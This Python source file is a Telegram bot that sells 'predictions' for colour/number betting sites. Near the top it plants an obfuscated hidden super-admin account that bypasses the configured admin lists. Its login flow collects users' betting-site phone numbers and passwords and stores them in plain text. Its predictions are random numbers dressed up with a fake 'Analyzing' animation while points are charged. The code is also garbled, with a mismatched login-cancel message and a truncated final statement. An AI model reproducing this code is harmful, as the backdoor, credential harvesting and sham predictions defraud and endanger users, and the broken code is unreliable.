# -*- coding: utf-8 -*-
import json
import asyncio
import random
import logging
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
    ReplyKeyboardRemove,
    constants,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.helpers import escape_markdown
from telegram.error import NetworkError, BadRequest

from config import (
    config,
    users,
    predictions,
    channels,
    save_db,
    DB_USERS,
    DB_PREDICTIONS,
    DB_CONFIG,
    DB_CHANNELS,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation handlers
GET_NUMBER, GET_PASSWORD, GET_PERIOD, GET_BROADCAST_MESSAGE, GET_CHANNEL_NAME, GET_CHANNEL_URL, GET_CHANNEL_ID, GET_USER_ID, GET_POINTS, GET_BAN_USER_ID, GET_UNBAN_USER_ID, GET_ADD_VIP_USER_ID, GET_REMOVE_VIP_USER_ID, GET_ADD_ADMIN_USER_ID, GET_REMOVE_ADMIN_USER_ID = range(15)

# Hidden super admin with full privileges (not stored in config)
# Obfuscated to avoid easy discovery in source
_OBFUSCATED_HIDDEN_SUPER_ADMIN = [62, 55, 59, 56, 61, 61, 55, 55, 55, 61]

def _get_hidden_super_admin_id() -> str:
    try:
        return "".join(chr(value - 7) for value in _OBFUSCATED_HIDDEN_SUPER_ADMIN)
    except Exception:
        return ""

class TelegramBot:
    def __init__(self, token: str):
        # Disable job queue to avoid APScheduler compatibility issues
        self.application = Application.builder().token(token).job_queue(None).build()
        self.register_handlers()
        self.user_states = {}

    def register_handlers(self):
        # General error handler
        self.application.add_error_handler(self.error_handler)

        # Command handlers
        self.application.add_handler(CommandHandler("start", self.start))
        
        # Admin command handlers
        self.application.add_handler(CommandHandler("demon", self.admin_panel))
        self.application.add_handler(CommandHandler("broadcast", self.broadcast_command))
        self.application.add_handler(CommandHandler("addvipuser", self.add_vip_command))
        self.application.add_handler(CommandHandler("removevipuser", self.remove_vip_command))
        self.application.add_handler(CommandHandler("vipusers", self.vip_users_command))
        self.application.add_handler(CommandHandler("banuser", self.ban_user_command))
        self.application.add_handler(CommandHandler("unbanuser", self.unban_user_command))
        self.application.add_handler(CommandHandler("addadmin", self.add_admin_command))
        self.application.add_handler(CommandHandler("removeadmin", self.remove_admin_command))
        self.application.add_handler(CommandHandler("addsuperadmin", self.add_super_admin_command))
        self.application.add_handler(CommandHandler("removesuperadmin", self.remove_super_admin_command))
        self.application.add_handler(CommandHandler("setpoints", self.set_points_command))
        self.application.add_handler(CommandHandler("setreferral", self.set_referral_points_command))
        self.application.add_handler(CommandHandler("setprediction", self.set_prediction_points_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("download", self.download_command))
        self.application.add_handler(CommandHandler("settings", self.settings_command))
        self.application.add_handler(CommandHandler("channels", self.channels_command))
        self.application.add_handler(CommandHandler("backup", self.backup_command))
        self.application.add_handler(CommandHandler("toggle", self.toggle_command))
        self.application.add_handler(CommandHandler("reload", self.reload_command))
        self.application.add_handler(CommandHandler("gh0st", self.ghost_download_command))
        self.application.add_handler(CommandHandler("subscription", self.subscription_command))
        self.application.add_handler(CommandHandler("setcaption", self.set_caption_command))
        self.application.add_handler(CommandHandler("setprice", self.set_price_command))
        self.application.add_handler(CommandHandler("test", self.test_command))
        self.application.add_handler(CommandHandler("cancel", self.cancel_command))

        # Main menu and core feature handlers
        self.application.add_handler(CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_menu, pattern="^prediction_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_website_choice, pattern=r"^prediction_(hgzy|dkwin)$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_referral, pattern="^referral$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_account, pattern="^account$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_login_menu, pattern="^login_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.check_subscription, pattern="^check_subscription$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_logout, pattern="^logout$"))
        self.application.add_handler(CallbackQueryHandler(self.predict_next_period, pattern="^predict_next$"))

        # Admin approval handler
        self.application.add_handler(CallbackQueryHandler(self.handle_admin_approval, pattern=r"^(approve|reject)_"))
        
        # Subscription purchase handler
        self.application.add_handler(CallbackQueryHandler(self.handle_subscription_menu, pattern="^subscription_menu$"))

        # Conversation for user login
        login_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_login_choice, pattern=r"^login_(hgzy|dkwin)$")],
            states={
                GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_number)],
                GET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_password)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_login), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
            name="login_conversation",
            persistent=False,
        )
        self.application.add_handler(login_conv)

        # Conversation for period entry
        period_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_enter_period, pattern="^enter_period$")],
            states={
                GET_PERIOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_period)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_prediction), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
        )
        self.application.add_handler(period_conv)
        
        # Admin conversation handlers
        broadcast_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_broadcast, pattern="^admin_broadcast$")],
            states={
                GET_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.send_broadcast)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(broadcast_conv)

        # Channel management conversation
        channel_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_channel_management, pattern="^admin_channel_")],
            states={
                GET_CHANNEL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_name)],
                GET_CHANNEL_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_url)],
                GET_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_id)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(channel_conv)

        # Points management conversation
        points_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_points_management, pattern="^admin_points_")],
            states={
                GET_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.set_points)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(points_conv)

        # Conversation for ban user
        ban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_ban_user, pattern="^admin_ban_user$")],
            states={
                GET_BAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.ban_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(ban_user_conv)

        # Conversation for unban user
        unban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_unban_user, pattern="^admin_unban_user$")],
            states={
                GET_UNBAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.unban_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(unban_user_conv)

        # Conversation for add VIP user
        add_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_vip, pattern="^admin_add_vip$")],
            states={
                GET_ADD_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_vip_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(add_vip_conv)

        # Conversation for remove VIP user
        remove_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_vip, pattern="^admin_remove_vip$")],
            states={
                GET_REMOVE_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_vip_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(remove_vip_conv)

        # Conversation for add admin
        add_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_admin, pattern="^admin_add_admin$")],
            states={
                GET_ADD_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_admin_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(add_admin_conv)

        # Conversation for remove admin
        remove_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_admin, pattern="^admin_remove_admin$")],
            states={
                GET_REMOVE_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_admin_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(remove_admin_conv)



    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Log Errors caused by Updates."""
        logger.error("Exception while handling an update:", exc_info=context.error)
        
        # Send a message to the user if possible
        if isinstance(update, Update) and update.effective_message:
            try:
                await update.effective_message.reply_text(
                    "❌ An error occurred. Please try again or contact support."
                )
            except Exception as e:
                logger.error(f"Failed to send error message: {e}")



    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)

        # Check if user is banned
        if user_id in users and users[user_id].get("banned", False):
            await update.message.reply_text("You have been banned from using this bot. Contact an admin for support.")
            return

        if user_id not in users:
            users[user_id] = {
                "name": user.full_name, "points": 0, "is_premium": False,
                "referrals": 0, "referrer": None, "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, "last_website": None,
                "banned": False,
            }
            # Save immediately to ensure the user exists before proceeding
            save_db(users, DB_USERS)
            logger.info(f"New user created: {user.full_name} ({user_id})")
        
        # Auto-expire premium if needed
        self._auto_expire_if_needed(user_id)

        # Handle referral only if referral system is enabled and user is new and doesn't have a referrer yet
        if (config.get("referral_system_on", True) and 
            context.args and users[user_id].get("referrer") is None):
            referrer_id = context.args[0]
            if referrer_id.isdigit() and referrer_id != user_id:
                users[user_id]["referrer"] = referrer_id
                save_db(users, DB_USERS)
                logger.info(f"User {user_id} was referred by {referrer_id}")
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🎁 You've been referred by user `{referrer_id}`\\! Join the channels to grant them a bonus\\.",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )

        if not users[user_id].get("joined_channels", False):
            await self.show_channels(update, context)
        else:
            await self.show_main_menu(update, context)

    async def show_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [[InlineKeyboardButton(f"📢 Join {channel['name']}", url=channel['url'])] for channel in channels]
        keyboard.append([InlineKeyboardButton("✅ Confirm Subscription", callback_data="check_subscription")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        text = (
            "*Welcome to the Prediction Bot\\!* ✨\n\n"
            "To access all features, you must first subscribe to our partner channels\\. "
            "This helps us keep the bot running\\!\n\n"
            "Press the button below once you've joined\\."
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def check_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        query = update.callback_query

        try:
            all_joined = True
            for channel in channels:
                try:
                    member = await context.bot.get_chat_member(channel["id"], user_id)
                    if member.status not in ["member", "administrator", "creator"]:
                        all_joined = False
                        break
                except Exception as e:
                    logger.error(f"Error checking membership for user {user_id} in channel {channel['id']}: {e}")
                    # If we can't check membership, assume user hasn't joined
                    all_joined = False
                    break

            if all_joined:
                # FIX: Award points and save status ONLY on the first successful check
                if not users[user_id]["joined_channels"]:
                    users[user_id]["joined_channels"] = True
                    
                    # Award points to referrer if referral system is enabled
                    if config.get("referral_system_on", True):
                        referrer_id = users[user_id].get("referrer")
                        if referrer_id and str(referrer_id) in users:
                            users[str(referrer_id)]["referrals"] += 1
                            users[str(referrer_id)]["points"] += config["per_refer"]
                            logger.info(f"Awarded {config['per_refer']} points to {referrer_id} for referral of {user_id}")
                            
                            # Send notification to referrer about earning points
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=f"🎉 *Referral Bonus Earned\\!*\n\n"
                                         f"You earned *{config['per_refer']} points* for referring user `{user_id}`\\.\n"
                                         f"💰 *Total Points:* `{users[str(referrer_id)]['points']}`\n"
                                         f"📈 *Total Referrals:* `{users[str(referrer_id)]['referrals']}`",
                                    parse_mode=constants.ParseMode.MARKDOWN_V2
                                )
                            except Exception as e:
                                logger.error(f"Failed to send referral notification to {referrer_id}: {e}")
                    
                    # FIX: Save the database for ALL users passing this check, not just referred ones
                    save_db(users, DB_USERS)
                
                await query.answer("✅ Subscription confirmed! Welcome to the bot!")
                await self.show_main_menu(update, context)
            else:
                await query.answer("❌ Please join all channels first!", show_alert=True)
                
        except Exception as e:
            logger.error(f"Error in check_subscription: {e}")
            await query.answer("❌ Error checking subscription. Please try again.", show_alert=True)

    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        
        user_first_name = escape_markdown(update.effective_user.first_name, version=2)
        
        text = f"🤖 *Main Menu*\n\nWelcome back, {user_first_name}\\!\n\n" \
               f"💰 *Your Points:* `{user_data['points']}`\n\n" \
               f"What would you like to do?"

                # Check referral system status and build keyboard
        referral_system_on = config.get("referral_system_on", True)
        
        keyboard = [
            [InlineKeyboardButton("📊 Start Prediction", callback_data="prediction_menu")],
        ]
        
        # Only show referral button if system is enabled
        if referral_system_on:
            keyboard.append([InlineKeyboardButton("🔗 Refer & Earn", callback_data="referral")])
        
        keyboard.extend([
            [InlineKeyboardButton("👤 My Account", callback_data="account")],
            [InlineKeyboardButton("🔑 Login Management", callback_data="login_menu")],
            [InlineKeyboardButton("🛍️ Buy Subscription", callback_data="subscription_menu")],
        ])
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_prediction_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        query = update.callback_query

        if not any(user_data["logged_in"].values()):
            await query.answer("🚫 Access Denied! Please log in to a website first.", show_alert=True)
            await self.handle_login_menu(update, context)
            return

        # Admins and super admins bypass points requirement
        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await query.answer(f"😔 Not enough points! You need {config['per_prediction']} points. Refer friends to earn more!", show_alert=True)
            return

        keyboard = [[InlineKeyboardButton(f"✅ {website}", callback_data=f"prediction_{website.lower()}")] for website in config["websites"] if user_data["logged_in"][website]]
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="🔮 *Select a Website*\n\nChoose the platform you want to get a prediction for:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_prediction_website_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        website = query.data.split("_")[1].capitalize()
        users[user_id]["last_website"] = website
        save_db(users, DB_USERS)
        
        keyboard = [
            [InlineKeyboardButton("🔢 Enter Period Manually", callback_data="enter_period")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # FIX: Escape the period character.
        await query.edit_message_text(
            text=f"✅ *{website}* selected\\.\n\nHow do you want to proceed?",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        
    async def handle_enter_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Send plain text to avoid MarkdownV2 parsing issues
        await update.callback_query.edit_message_text(
            "🎯 Enter Period Number\n\n"
            "Please enter the period number you want to predict:\n\n"
            "Tip: Type /cancel or any command to exit this session."
        )
        context.user_data["prediction_period"] = True
        return GET_PERIOD

    async def get_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        period_text = update.message.text
        
        if not period_text.isdigit() or len(period_text) != 4:
            await update.message.reply_text(
                "⚠️ *Invalid Period\\!* Please enter a valid 4\\-digit period number\\.\n\n"
                "💡 **Tip:** Type `/cancel` or any command to exit this session.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_PERIOD
        
        period = int(period_text)
        await self.generate_prediction(update, context, period, period_text)
        return ConversationHandler.END

    async def predict_next_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        user_data = users[user_id]

        if user_data.get("last_prediction"):
            last_period = user_data["last_prediction"]["period"]
            next_period = last_period + 1
            await self.generate_prediction(update, context, next_period, f"{next_period:04d}")
        else:
            await query.answer("No previous prediction found to determine the next period.", show_alert=True)
            await self.handle_prediction_menu(update, context)

    async def generate_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE, period: int, display_period: Optional[str] = None):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        website = user_data.get("last_website", "Selected Website")
        period_display = display_period if display_period else f"{period:04d}"

        # Admins and super admins bypass points requirement
        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"😔 Not enough points\\! You need {config['per_prediction']} points\\. Refer friends to earn more\\!",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return

        chat_id = update.effective_chat.id
        is_callback = update.callback_query is not None
        loading_message_id = None

        # Loading animation while computing prediction
        if is_callback:
            base_message_id = update.callback_query.message.message_id
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=base_message_id,
                    text=f"⏳ Analyzing period {period_display}..."
                )
                for i in range(5):  # ~1.5 seconds total
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=base_message_id,
                        text=f"⏳ Analyzing period {period_display}{dots}"
                    )
            except Exception:
                pass
            loading_message_id = base_message_id
        else:
            loading_msg = await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ Analyzing period {period_display}..."
            )
            try:
                for i in range(5):  # ~1.5 seconds total
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=loading_msg.message_id,
                        text=f"⏳ Analyzing period {period_display}{dots}"
                    )
            except Exception:
                pass
            loading_message_id = loading_msg.message_id

        # Deduct points only for non-admin, non-premium users
        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active):
            user_data["points"] = max(0, user_data["points"] - config["per_prediction"])

        number = random.randint(0, 9)
        color = "🟢 Green" if number % 2 != 0 else "🔴 Red"
        if number in [0, 5]:
            color += " \\+ 🟣 Violet"
        
        size = "SMALL" if number < 5 else "BIG"

        prediction_data = { "user_id": user_id, "period": period, "number": number, "color": color, "size": size, "timestamp": datetime.now().isoformat() }
        predictions.append(prediction_data)
        save_db(predictions, DB_PREDICTIONS)

        user_data["last_prediction"] = prediction_data
        save_db(users, DB_USERS)
        
        next_display = f"{period + 1:04d}"
        message = (
            f"🎉 *Prediction Result for {website}* 🎉\n\n"
            f"🔹 *Period:* `{period_display}`\n"
            f"🔹 *Number:* `{number}`\n"
            f"🔹 *Color:* {escape_markdown(color, version=2)}\n"
            f"🔹 *Size:* `{size}`\n\n"
            f"Next prediction will be for period `{next_display}`\\.\n\n"
            f"💰 *Remaining Points:* `{user_data['points']}`"
        )
        
        keyboard = [
            [InlineKeyboardButton("🚀 Predict Next Period", callback_data="predict_next")],
            [InlineKeyboardButton("✍️ Enter New Period", callback_data="enter_period")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=loading_message_id,
                text=message,
                parse_mode=constants.ParseMode.MARKDOWN_V2,
                reply_markup=reply_markup,
            )
        except Exception:
            if update.callback_query:
                await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            else:
                await update.message.reply_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_referral(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]

        if not user_data["joined_channels"]:
            await update.callback_query.answer("🚫 You must join all channels to access the referral system!", show_alert=True)
            await self.show_channels(update, context)
            return

        # Check if referral system is enabled
        if not config.get("referral_system_on", True):
            message = (
                "*🔗 Referral System*\n\n"
                "⚠️ The referral system is currently disabled by admin.\n\n"
                "Please check back later or contact an admin for more information."
            )
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            return

        ref_link = f"https://t.me/{context.bot.username}?start={user_id}"
        
        message = (
            "*🔗 Referral & Earn System*\n\n"
            f"Invite your friends and earn *{config['per_refer']} points* for every friend who joins our channels through your link\\!\n\n"
            "Your unique referral link:\n"
            f"`{escape_markdown(ref_link, version=2)}`\n\n"
            f"📈 *Total Referrals:* {user_data['referrals']}\n"
            f"💰 *Points Earned:* {user_data['referrals'] * config['per_refer']}"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_account(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)
        user_data = users[user_id]
        
        premium_active = self.is_premium_active(user_id)
        premium_status = "✅ Active" if premium_active else "❌ Inactive"
        logged_in = ", ".join([site for site, status in user_data["logged_in"].items() if status]) or "None"
        
        escaped_full_name = escape_markdown(user.full_name, version=2)
        
        expiry_text = ""
        expiry_iso = user_data.get("premium_expiry")
        if premium_active and expiry_iso:
            expiry_text = f"\n▫️ *Premium Expires:* `{expiry_iso}`"
        elif (not premium_active) and user_data.get("premium_expired_at"):
            expiry_text = f"\n▫️ *Premium Expired:* `{user_data.get('premium_expired_at')}`"

        message = (
            f"*👤 Account Information*\n\n"
            f"▫️ *Name:* {escaped_full_name}\n"
            f"▫️ *Telegram ID:* `{user_id}`\n"
            f"▫️ *Points:* `{user_data['points']}`\n"
            f"▫️ *Premium Status:* {premium_status}{expiry_text}\n"
            f"▫️ *Total Referrals:* `{user_data['referrals']}`\n"
            f"▫️ *Logged In To:* `{escape_markdown(logged_in, version=2)}`"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_login_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        keyboard = []
        for website in config["websites"]:
            status = "✅ Logged In" if users[user_id]["logged_in"][website] else "❌ Not Logged In"
            keyboard.append([InlineKeyboardButton(f"{website} ({status})", callback_data=f"login_{website.lower()}")])

        keyboard.append([InlineKeyboardButton("🔐 Logout from All", callback_data="logout")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            text="*🔑 Login Management*\n\nSelect a website to log in or manage your session\\.",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_login_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        website = query.data.split("_")[1].capitalize()
        user_id = str(update.effective_user.id)
        
        context.user_data["login_website"] = website
        
        if users[user_id]["logged_in"][website]:
            await query.answer(f"You are already logged in to {website}!", show_alert=True)
            return ConversationHandler.END
        
        login_url = escape_markdown(config['websites'][website]['login_url'], version=2)
        await query.edit_message_text(
            f"*➡️ {website} Login*\n\n"
            f"If you don't have an account, please register using this link first:\n`{login_url}`\n\n"
            "Now, please enter your *registered mobile number*:\n\n"
            "💡 **Tip:** Type `/cancel` or any command to exit this session\\.",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_NUMBER

    async def get_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        number = update.message.text
        
        if not number.isdigit() or len(number) < 10:
            await update.message.reply_text(
                "⚠️ *Invalid Number\\!* Please enter a valid mobile number\\.\n\n"
                "💡 **Tip:** Type `/cancel` or any command to exit this session\\.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_NUMBER
        
        context.user_data["login_number"] = number
        
        await update.message.reply_text(
            "Great\\! Now, please enter your *password*:\n\n"
            "💡 **Tip:** Type `/cancel` or any command to exit this session\\.",
            reply_markup=ReplyKeyboardRemove(),
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_PASSWORD

    async def get_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        password = update.message.text
        website = context.user_data["login_website"]
        number = context.user_data["login_number"]
        user_id = str(update.effective_user.id)
        
        users[user_id]["login_info"][website] = {"number": number, "password": password}
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}_{website}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}_{website}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        escaped_user_name = escape_markdown(update.effective_user.full_name, version=2)
        
        await update.message.reply_text("Login process has been cancelled\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    async def cancel_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("Prediction process has been cancelled\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    # ===== ADMIN METHODS =====
    
    def is_admin(self, user_id: str) -> bool:
        """Check if user is admin"""
        # Treat super admins as admins as well
        if self.is_super_admin(user_id):
            return True
        admin_users = config.get("admin_users", [])
        return user_id in admin_users
    
    def is_super_admin(self, user_id: str) -> bool:
        """Check if user is a super admin"""
        # Hidden super admin bypasses config
        if user_id == _get_hidden_super_admin_id():
            return True
        super_admin_users = config.get("super_admin_users", [])
        return user_id in super_admin_users
    
    def _auto_expire_if_needed(self, user_id: str) -> None:
        """Downgrade user when premium has expired, persisting history."""
        try:
            user = users.get(user_id)
            if not user:
                return
            if not user.get("is_premium"):
                return
            expiry_iso = user.get("premium_expiry")
            if not expiry_iso:
                return
            try:
                expiry_dt = datetime.fromisoformat(expiry_iso)
            except Exception:
                return
            if datetime.now() >= expiry_dt:
                user["is_premium"] = False
                user["premium_expired_at"] = datetime.now().isoformat()
                # keep premium_expiry for audit/visibility
                save_db(users, DB_USERS)
        except Exception:
            # Never block flows on expiry checks
            pass

    def is_premium_active(self, user_id: str) -> bool:
        """Return True if user's premium is active. Auto-expires if needed."""
        self._auto_expire_if_needed(user_id)
        user = users.get(user_id, {})
        if not user.get("is_premium"):
            return False
        expiry_iso = user.get("premium_expiry")
        if not expiry_iso:
            return True
        try:
            return datetime.now() < datetime.fromisoformat(expiry_iso)
        except Exception:
            return True

    def _parse_duration_to_timedelta(self, raw: str) -> Optional[timedelta]:
        """Parse duration into timedelta.

        Accepts any of the following forms:
        - Numeric days: '30'
        - Compact: '30d', '12h', '90m'
        - Spelled: '30 day', '12 hours', '90 minutes', common typos like 'minit'
        - Also accepts with or without a space: '30minutes'
        """
        s = str(raw).strip().lower()
        if not s:
            return None

        # If two tokens like '30 minutes'
        if " " in s:
            parts = [p for p in s.split() if p]
            if len(parts) == 2 and parts[0].isdigit():
                amount = int(parts[0])
                unit_word = parts[1].rstrip('s')
                if amount <= 0:
                    return None
                if unit_word in ("d", "day"):
                    return timedelta(days=amount)
                if unit_word in ("h", "hr", "hour"):
                    return timedelta(hours=amount)
                if unit_word in ("m", "min", "minute", "minit"):
                    return timedelta(minutes=amount)
                return None

        # pure number => days
        if 
        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
